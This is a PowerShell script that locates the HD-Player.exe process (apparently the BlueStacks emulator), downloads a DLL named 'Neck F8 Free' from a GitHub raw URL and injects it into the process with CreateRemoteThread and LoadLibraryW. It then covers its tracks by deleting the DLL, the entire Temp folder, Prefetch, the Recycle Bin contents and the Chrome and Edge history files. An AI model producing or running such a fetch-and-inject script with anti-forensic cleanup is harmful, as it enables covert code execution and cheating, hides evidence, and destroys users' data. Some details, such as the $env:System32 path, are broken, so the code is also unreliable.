# ================== CONFIG ===================== #
$GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/neck/main/Neck%20F8%20Free.dll" # আপনার GitHub DLL Raw URL
$processName = "HD-Player.exe"

# Process থেকে PID পাওয়া
$proc = Get-Process -Name ($processName -replace '\.exe$', '') -ErrorAction SilentlyContinue

if ($proc) {
    $TargetPID = $proc.Id
    Write-Host "[*] Found process '$processName' with PID $TargetPID"
} else {
    Write-Host "[-] Process '$processName' not found. Exiting script."
    exit
}

$LocalDLL_Path = "$env:System32\Neck_F8_Free.dll"
# =============================================== #

Write-Host "[*] Downloading DLL from GitHub..."
Invoke-WebRequest -Uri $GitHubDLL_URL -OutFile $LocalDLL_Path

Write-Host "[*] Preparing injector..."

$injectorCode = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class Injector {
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Inject(int pid, string dllPath) {
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr allocMemAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)((dllPath.Length + 1) * 2),
            0x1000 | 0x2000, 0x04);

        byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
        UIntPtr bytesWritten;
        WriteProcessMemory(hProcess, allocMemAddress, dllBytes, (uint)dllBytes.Length, out bytesWritten);

        IntPtr kernel32Handle = GetModuleHandle("kernel32.dll");
        IntPtr loadLibraryAddr = GetProcAddress(kernel32Handle, "LoadLibraryW");

        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
    }
}
"@

Add-Type -TypeDefinition $injectorCode -Language CSharp

Write-Host "[*] Injecting DLL into PID $TargetPID ..."
[Injector]::Inject($TargetPID, $LocalDLL_Path)

Write-Host "✅ DLL Injected into PID $TargetPID from GitHub"

# ================= Cleaning Section ================= #

Write-Host "[*] Cleaning Temp, Prefetch, Recycle Bin and Download History..."

# Delete the DLL itself from Temp
try {
    Remove-Item -Path $LocalDLL_Path -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Injected DLL file deleted from Temp"
} catch { Write-Host "[-] DLL delete failed: $_" }

# Clear Temp Folder (all files and folders)
try {
    Remove-Item -Path "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue
    Write-Host "[+] %TEMP% folder fully cleared"
} catch { Write-Host "[-] %TEMP% clear failed: $_" }

# Clear Windows Prefetch
try {
    Remove-Item -Path "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
    Write-Host "[+] Prefetch folder cleared"
} catch { Write-Host "[-] Prefetch clear failed: $_" }

# Empty Recycle Bin
try {
    $shell = New-Object -ComObject Shell.Application
    $recycleBin = $shell.NameSpace(0xA)
    $items = $recycleBin.Items()
    $count = $items.Count
    if ($count -gt 0) {
        foreach ($item in $items) {
            Remove-Item $item.Path -Recurse -Force -ErrorAction SilentlyContinue
        }
        Write-Host "[+] Recycle Bin emptied"
    } else {
        Write-Host "[*] Recycle Bin is already empty"
    }
} catch { Write-Host "[-] Recycle Bin emptying failed: $_" }

# Clear Browser Download History (Chrome, Edge)
try {
    $LocalAppData = $env:LOCALAPPDATA
    $ChromeHistory = "$LocalAppData\Google\Chrome\User Data\Default\History"
    $EdgeHistory = "$LocalAppData\Microsoft\Edge\User Data\Default\History"
    
    if (Test-Path $ChromeHistory) {
        Remove-Item $ChromeHistory -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Chrome Download History cleared"
    }
    if (Test-Path $EdgeHistory) {
        Remove-Item $EdgeHistory -Force -ErrorAction SilentlyContinue
        Write-Host "[+] Edge Download History cleared"
    }
} catch { Write-Host "[-] Browser history clear failed: $_" }

Write-Host "✅ Cleaning Complete"
